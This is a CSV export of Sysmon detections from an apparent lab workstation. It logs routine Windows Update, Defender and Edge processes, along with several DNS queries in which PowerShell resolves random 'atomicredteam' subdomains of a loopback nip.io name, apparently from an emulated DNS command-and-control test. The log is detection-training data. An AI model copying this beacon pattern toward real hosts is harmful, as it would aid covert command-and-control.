"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:26:17.395 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173836,"Cmdline: ""C:\WINDOWS\uus\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\AMD64\UpdateDeploy.dll /ClassId 32246886-5935-4ae6-99ab-7f7a0c4c6e22 /RunHandlerComServer ¦ Proc: C:\Windows\UUS\amd64\wuaucltcore.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 5416 ¦ PGUID: E9F06A57-62C9-694E-4102-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Windows Update ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=1099C27D5DF5D02D24D389562BA96B33,SHA256=7D598543449852B3B6A6B514524A65A7274485AE0634C7895DF53BAFE1155740,IMPHASH=350CB9EECD5DD778EE70D63CD8A85A6D","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1309.2410.30012.0 ¦ IntegrityLevel: System ¦ OriginalFileName: wuaucltcore.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:17.329","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.420 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173887,"Cmdline: ""C:\WINDOWS\SoftwareDistribution\Download\Install\AM_Delta.exe"" WD /q ¦ Proc: C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: ""C:\WINDOWS\uus\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\AMD64\UpdateDeploy.dll /ClassId 32246886-5935-4ae6-99ab-7f7a0c4c6e22 /RunHandlerComServer ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-62CE-694E-4202-000000002400 ¦ ParentPID: 5416 ¦ ParentPGUID: E9F06A57-62C9-694E-4102-000000002400 ¦ Description: AntiMalware Definition Update ¦ Product: Microsoft Malware Protection ¦ Company: Microsoft Corporation ¦ Hashes: MD5=8F43D00B59B16A2CE9621A343664A9F4,SHA256=527F7052E23CC93BFD250987BBE482140420AC93B311F337D3D9AFD5BE134977,IMPHASH=52CEE9C1BC4BDA1F4F98A36E5EF61615","CurrentDirectory: C:\WINDOWS\SoftwareDistribution\Download\Install\ ¦ FileVersion: 1.443.332.0 ¦ IntegrityLevel: System ¦ OriginalFileName: AM_Delta.exe ¦ ParentImage: C:\Windows\UUS\amd64\wuaucltcore.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:22.393","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.492 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173888,"Cmdline: C:\WINDOWS\system32\MpSigStub.exe /stub 1.1.24010.2001 /payload 1.443.332.0 /MpWUStub /program C:\WINDOWS\SoftwareDistribution\Download\Install\AM_Delta.exe WD /q ¦ Proc: C:\Windows\System32\MpSigStub.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: ""C:\WINDOWS\uus\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\AMD64\UpdateDeploy.dll /ClassId 32246886-5935-4ae6-99ab-7f7a0c4c6e22 /RunHandlerComServer ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 2568 ¦ PGUID: E9F06A57-62CE-694E-4302-000000002400 ¦ ParentPID: 5416 ¦ ParentPGUID: E9F06A57-62C9-694E-4102-000000002400 ¦ Description: Microsoft Malware Protection Signature Update Stub ¦ Product: Microsoft Malware Protection ¦ Company: Microsoft Corporation ¦ Hashes: MD5=71CF589293424C4389202C7F1752FB2D,SHA256=071B0D3A08503A8B88AEEDA1D20F371A563377028F6E252DC66CCE60AB8F823E,IMPHASH=73D10F665B566678AC1DDF9942FDAEA0","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1.1.24010.2001 (7122f19e8a45ed98fbe41ea0bdadf251e45717f9) ¦ IntegrityLevel: System ¦ OriginalFileName: MpSigStub.exe ¦ ParentImage: C:\Windows\UUS\amd64\wuaucltcore.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:22.479","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.872 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173987,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 5588 ¦ PGUID: E9F06A57-62D8-694E-4602-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:32.865","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:58.104 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174232,"Cmdline: ""C:\WINDOWS\system32\usoclient.exe"" StartWork ¦ Proc: C:\Windows\System32\UsoClient.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 1476 ¦ PGUID: E9F06A57-62F2-694E-4802-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: UsoClient ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=EF80BF9A119930AF16BC044C49C47729,SHA256=218CCEC2BCDD01D8EF2065C9DE49C077AF1891639B5F264CC3A17F0E131D4761,IMPHASH=1BC6441172601AD7E84C0082681FF7D2","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2033 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:58.010","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:58.335 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174233,"Cmdline: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=asset_store.mojom.AssetStoreService --lang=en-GB --service-sandbox-type=asset_store_service --video-capture-use-gpu-memory-buffer --no-pre-read-main-dll --ram-no-pressure-read-main-dll --metrics-shmem-handle=5292,i,2196327793326307530,1410864093827094960,524288 --field-trial-handle=1988,i,13279507995747332574,9132512059420465572,262144 --variations-seed-version --trace-process-track-uuid=3190708998493415531 --mojo-platform-channel-handle=4788 /prefetch:14 ¦ Proc: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window --win-session-start ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 1608 ¦ PGUID: E9F06A57-62F2-694E-4902-000000002400 ¦ ParentPID: 772 ¦ ParentPGUID: E9F06A57-607E-694E-4201-000000002400 ¦ Description: Microsoft Edge ¦ Product: Microsoft Edge ¦ Company: Microsoft Corporation ¦ Hashes: MD5=EEDCB91823A577336215FD725124B011,SHA256=9AFD1452D57620CC28C97C1760BB3FD195FB69D76037818EC956DE75B85771F1,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedge.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:58.288","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.171 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174682,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /c ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 3788 ¦ PGUID: E9F06A57-6317-694E-4A02-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Microsoft Edge Update ¦ Product: Microsoft Edge Update ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B299AA9A27C330A9B44E45BD1595DBEA,SHA256=955B5950FD92E5C5EEC395B022566C9A2594CA3126D894408E2E29BA25D8B0DD,IMPHASH=CD3B2D99C6655A5D4A14E30E380F5BF9","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1.3.215.9 ¦ IntegrityLevel: System ¦ OriginalFileName: msedgeupdate.dll ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:27:35.161","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173837,"Query: atomicredteam-855333.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.000","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173838,"Query: atomicredteam-355586.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.173","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173839,"Query: atomicredteam-525325.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.276","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173840,"Query: atomicredteam-883750.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.323","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173841,"Query: atomicredteam-469297.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.373","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173842,"Query: atomicredteam-493113.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.420","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173843,"Query: atomicredteam-708356.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.460","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173844,"Query: atomicredteam-750961.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.632","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173845,"Query: atomicredteam-649441.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.675","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
